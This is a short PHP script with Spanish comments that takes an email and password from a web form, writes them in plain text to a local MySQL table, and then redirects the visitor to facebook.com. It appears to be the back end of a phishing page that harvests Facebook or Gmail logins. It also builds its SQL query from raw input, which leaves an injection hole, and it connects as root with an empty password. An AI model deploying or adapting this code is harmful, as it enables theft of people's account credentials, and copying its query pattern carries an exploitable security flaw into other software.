<?php
// Verificar si se recibió una solicitud POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $correo = $_POST["email"];
    $contra = $_POST["contra"];

    // Conectar a la base de datos (reemplaza con tus credenciales)
    $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "inicio";

    $conn = new mysqli($servername, $username, $password, $dbname);

    // Verificar si la conexión fue exitosa
    if ($conn->connect_error) {
        die("Error de conexión: " . $conn->connect_error);
    }

    // Preparar y ejecutar la consulta SQL para insertar los datos en la base de datos
    $sql = "INSERT INTO datos (gmail, contra) VALUES ('$correo', '$contra')";

    if ($conn->query($sql) === TRUE) {
        // Redireccionar a la página del formulario con un parámetro para indicar que el formulario fue enviado correctamente
        header("Location: https://www.facebook.com?enviado=true");
        exit;
    } else {
        echo "Error al guardar el mensaje: " . $conn->error;
    }

    // Cerrar la conexión a la base de datos
    $conn->close();
}
?>
